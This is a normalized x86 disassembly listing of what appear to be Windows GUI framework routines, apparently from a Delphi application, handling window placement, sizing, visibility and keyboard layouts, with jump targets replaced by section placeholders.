mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403468
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_443118
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43f0c4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_443170
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419888
mov edx [ r-xdata ]
call sub_40341c
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_4431a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4139c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4431cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4446f8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_443228
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_443194
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4139c8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_443268
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405640
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405640
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_4432d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44337c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443383
lea eax [ ebp - 0x4 ]
call sub_405628
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43bb70
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_40326c
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405628
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403468
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405640
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ edi + 0x178 ] eax
sub_44338c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_440f90
xor edx edx
push ebp
push sub_44344e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403468
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443455
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_443455
mov eax [ ebp - 0x4 ]
call sub_455b0c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43e124
sub_4434a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031b4
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fd84
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44350a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43e124
sub_443524
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44354c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_455b0c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_455a14
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403468
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44354c
test al al
jne r-xdata
sub_4435b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44354c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445864
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4435e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44354c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445864
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44360c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_443634
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_455b0c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_455a14
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403468
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_443634
test al al
jne r-xdata
sub_44369c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443634
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4436bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443634
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4436fc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_455b0c
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403468
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4436fc
test al al
jne r-xdata
sub_443760
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4436fc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443780
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43f0c4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_443780
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_443830
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_443780
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_455b0c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43f0c4
test eax eax
jne r-xdata
sub_4438d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4438f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442378
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44392c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44394c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44399c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_4439c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43d190
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_441428
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4413ec
mov dl [ esp ]
mov si 0xffd1
call sub_403468
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_443a18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403468
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_443a3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403468
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_443a74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fb98
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_441488
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_441c98
sub_443aac
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403468
pop esi
pop ebx
retn
mov eax ebx
call sub_43e520
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40447c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40447c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_443b2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442078
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43fc6c
sub_443b8c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_441dec
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_4411e8
pop ebx
retn
sub_443bbc
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_443be4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_4411e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_443c54
push ebx
mov ebx eax
mov eax ebx
call sub_43fad8
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_441488
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41c6a8
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43f0c4
sub_443c90
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43c770
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4446f8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43f0c4
sub_443cd0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4449fc
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4446f8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443d10
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_441488
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_444600
sub_443d50
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_444838
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_444838
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_443db0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43eb20
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43da08
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_441fe4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_443e20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fc10
mov edx esi
mov eax ebx
call sub_441448
pop esi
pop ebx
retn
sub_443e3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43adac
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_455b0c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403468
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403468
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403468
test al al
jne r-xdata
sub_443ed0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445864
mov edx esi
mov eax ebx
call sub_443e3c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43f0c4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43f0c4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43f0c4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455b0c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43f0c4
test eax eax
jne r-xdata
jmp r-xdata
sub_443fb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43f0c4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_444008
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43f0c4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455b0c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43f0c4
test eax eax
jne r-xdata
sub_444054
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_443e3c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43f0c4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455b0c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43f0c4
test eax eax
jne r-xdata
sub_4440b0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455b0c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43f0c4
mov [ esi + 0xc ] eax
sub_4440e4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d518
mov eax ebx
mov si 0xffd0
call sub_403468
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43d864
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4441bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_441428
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4413ec
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403468
inc edi
dec ebx
jne r-xdata
sub_444204
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440f90
xor eax eax
push ebp
push sub_4442a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4441bc
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43dae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4442a9
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4442b0
push ebx
push esi
push edi
push ebp
